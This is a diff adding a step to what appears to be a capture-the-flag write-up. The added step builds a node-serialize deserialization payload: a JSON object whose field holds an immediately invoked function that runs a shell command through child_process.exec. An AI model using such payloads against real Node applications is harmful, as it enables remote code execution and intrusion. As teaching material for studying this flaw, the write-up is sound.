@@ -149,6 +149,15 @@ Serialized:
 {"rce":"_$$ND_FUNC$$_function(){\n require('child_process').exec('uname -a', function(error, stdout, stderr) { console.log(stdout) });\n }"}
 {% endhighlight %}
 
+Now we had a RCE part of our exploit.<br>
+By combining previous JSON and this serialized RCE code, we can obtain the payload.
+{% highlight shell %}
+{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"_$$ND_FUNC$$_function(){\n require('child_process').exec('uname -a', function(error, stdout, stderr) { console.log(stdout) });\n }()"}
+{% endhighlight %}
+{% highlight shell %}
+
+{% endhighlight %}
+
 ### 3. Getting Root
 
 
